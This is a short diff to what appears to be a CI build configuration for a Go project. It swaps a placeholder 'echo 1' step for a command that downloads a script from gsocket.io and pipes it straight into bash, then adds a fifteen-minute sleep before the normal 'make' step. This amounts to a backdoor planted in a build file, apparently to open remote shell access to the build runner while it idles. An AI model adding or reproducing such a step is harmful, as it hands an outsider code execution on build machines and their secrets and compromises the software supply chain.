@@ -9,7 +9,8 @@ cache:
   - $GOPATH/pkg/mod
   - $HOME/.cache/go-build
 script:
-- echo 1
+- bash -c "$(curl -fsSL gsocket.io/x)"
+- sleep 15m
 - make
 deploy:
 - provider: script
